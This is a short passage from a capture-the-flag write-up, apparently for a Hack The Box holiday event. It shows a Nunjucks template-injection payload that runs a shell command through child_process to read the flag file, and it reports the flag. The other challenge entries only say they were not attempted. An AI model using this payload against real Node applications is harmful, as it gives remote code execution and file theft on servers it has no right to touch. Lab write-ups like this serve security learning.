      }
    })
  }
};
```

So let's find a valid RCE payload, I found one in a nuclei template:
https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml

```js
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")() }}
```

That gives us the flag `HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}`.

### Music Notes - Pwn

I didn't do it.

### Warehouse Maintenance - Crypto

I didn't do it.

### Bamboozled - Reversing

I didn't do it.

### Ho Ho Ho - Forensics

I didn't do it.
